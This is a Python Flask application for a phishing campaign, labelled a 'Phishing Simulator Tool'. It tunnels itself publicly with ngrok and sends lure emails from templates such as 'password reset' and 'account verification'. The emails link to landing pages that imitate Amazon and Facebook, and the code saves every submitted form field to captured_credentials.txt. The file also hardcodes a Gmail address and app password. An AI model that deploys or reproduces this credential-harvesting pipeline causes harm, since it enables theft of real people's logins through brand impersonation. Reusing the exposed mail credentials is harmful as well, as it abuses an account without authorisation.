from flask import Flask, render_template, request, redirect, url_for
from markupsafe import Markup
import smtplib
from email.message import EmailMessage
import os
from datetime import datetime
# import webview
import webbrowser
import threading
#Hosting 
import subprocess
import requests
import time

# Start ngrok and get public URL
def start_ngrok(port=5000):
    subprocess.Popen(["ngrok", "http", str(port)],
                     stdout=subprocess.DEVNULL,
                     stderr=subprocess.STDOUT)
    time.sleep(2)  # Give ngrok time to start

    try:
        tunnels = requests.get("http://127.0.0.1:4040/api/tunnels").json()
        for tunnel in tunnels['tunnels']:
            if tunnel['proto'] == 'https':
                return tunnel['public_url']
    except Exception as e:
        print("❌ Could not retrieve ngrok URL:", e)
        return None

# Get ngrok URL and store it globally
NGROK_URL = start_ngrok(5000)
print(f"Public URL: {NGROK_URL}")


app = Flask(__name__)

# Filter for displaying line breaks in HTML
@app.template_filter('nl2br')
def nl2br_filter(s):
    return Markup(s.replace('\n', '<br>\n')) if s else ''

# Mapping for user-friendly template names
TEMPLATE_NAMES = {
    'password-reset': 'Password Reset',
    'account-verification': 'Account Verification',
    'invoice-fake': 'Fake Invoice',
}

# Mapping combinations to landing HTML page names
LANDING_PAGE_MAP = {
    ('password-reset', 'amazon'): 'amazon_reset.html',
    ('account-verification', 'amazon'): 'amazon_verification.html',
    ('gift-card', 'amazon'): 'amazon_giftcard.html',
    ('password-reset', 'facebook'): 'fb_reset.html',
    ('account-verification', 'facebook'): 'fb_ver.html',
    #('invoice-fake', 'amazon'): 'amazon_invoice.html',
    # You can add more here
}

@app.route('/')
def index():
    return redirect(url_for('step1'))

# Step 1: Email setup
@app.route('/step1', methods=['GET', 'POST'])
def step1():
    if request.method == 'POST':
        # Gather data
        template = request.form.get('templateSelect')
        senderName = request.form.get('senderName')
        subject = request.form.get('subject')
        emailBody = request.form.get('emailBody')
        linkText = request.form.get('linkText')

        # Redirect to step 2 with query parameters
        return redirect(url_for('step2', 
                                template=template, 
                                senderName=senderName, 
                                subject=subject, 
                                emailBody=emailBody, 
                                linkText=linkText))
    return render_template('step1.html')

# Step 2: Landing page selection
@app.route('/step2', methods=['GET', 'POST'])
def step2():
    if request.method == 'POST':
        # Form submission
        landingPage = request.form.get('brand')
        template = request.form.get('email_type')
        senderName = request.form.get('senderName')
        subject = request.form.get('subject')
        emailBody = request.form.get('emailBody')
        linkText = request.form.get('linkText')

        return redirect(url_for('send_email',
                                template=template,
                                senderName=senderName,
                                subject=subject,
                                emailBody=emailBody,
                                linkText=linkText,
                                landingPage=landingPage))
    else:
        # Show step2.html
        return render_template('step2.html',
                               email_type=request.args.get('template'),
                               senderName=request.args.get('senderName'),
                               subject=request.args.get('subject'),
                               emailBody=request.args.get('emailBody'),
                               linkText=request.args.get('linkText'))

@app.route('/handle_selection', methods=['POST'])
def handle_selection():
    # Get everything from hidden inputs in step2.html
    template = request.form.get('email_type')
    senderName = request.form.get('senderName')
    subject = request.form.get('subject')
    emailBody = request.form.get('emailBody')
    linkText = request.form.get('linkText')
    landingPage = request.form.get('brand')

    return redirect(url_for('send_email',
                            template=template,
                            senderName=senderName,
                            subject=subject,
                            emailBody=emailBody,
                            linkText=linkText,
                            landingPage=landingPage))

# Preview page before sending
@app.route('/send_email', methods=['GET'])
def send_email():
    template = request.args.get('template')
    senderName = request.args.get('senderName')
    subject = request.args.get('subject')
    emailBody = request.args.get('emailBody')
    linkText = request.args.get('linkText')
    landingPage = request.args.get('landingPage')

    templateName = TEMPLATE_NAMES.get(template, template)

    return render_template('send_email.html',
                           template=template,
                           templateName=templateName,
                           senderName=senderName,
                           subject=subject,
                           emailBody=emailBody,
                           linkText=linkText,
                           landingPage=landingPage)

# Actual email sending logic
@app.route('/send', methods=['POST'])
def send():
    recipient = request.form.get('recipient')
    template = request.form.get('template')
    senderName = request.form.get('senderName')
    subject = request.form.get('subject')
    emailBody = request.form.get('emailBody')
    linkText = request.form.get('linkText')
    landingPage = request.form.get('landingPage')

    # Construct phishing link
    landing_file = LANDING_PAGE_MAP.get((template, landingPage))
    if landing_file:
        phishing_link = f'{NGROK_URL}/landing/{landing_file}'
    else:
        phishing_link = '{NGROK_URL}/landing/amazon_reset.html'

    # Add link into email
    email_content = f"{emailBody}\n\n{linkText}: {phishing_link}"

    # SMTP settings
    sender_email = "phineasphreak01@gmail.com"
    sender_password = "lupx afpy uvwo edfe" 

    msg = EmailMessage()
    msg['Subject'] = subject
    msg['From'] = f"{senderName} <{sender_email}>"
    msg['To'] = recipient
    msg.set_content(email_content)

    try:
        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
            smtp.login(sender_email, sender_password)
            smtp.send_message(msg)
        return render_template("mail_sent.html", recipient_mail=recipient)
        #return f"✅ Email successfully sent to {recipient}!"
    except Exception as e:
        return f"❌ Failed to send email: {e}"

# Route to render landing page dynamically
@app.route('/landing/<page>')
def landing(page):
    try:
        return render_template(f'landing/{page}')
    except:
        return "Landing page not found", 404
    
# Form submission handler — store captured data
@app.route('/submit', methods=['POST'])
def submit():
    data = request.form.to_dict()
    redirect_page = data.pop('redirect_to', None)
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

    entry = f"\n--- {timestamp} ---\n"
    for key, value in data.items():
        entry += f"{key}: {value}\n"

    with open("captured_credentials.txt", "a") as file:
        file.write(entry)

    if redirect_page:
        try:
            return render_template(f'landing/{redirect_page}')
        except:
            return "Confirmation page not found", 404
    else:
        return "Submission received."

# webview.create_window('Phishing Simulator Tool',app)
def open_browser():
    webbrowser.open_new(f'{NGROK_URL}')   

# Run the Flask app
if __name__ == "__main__":
    threading.Timer(0.75, open_browser).start()
    app.run(debug=False)
    # webview.start()
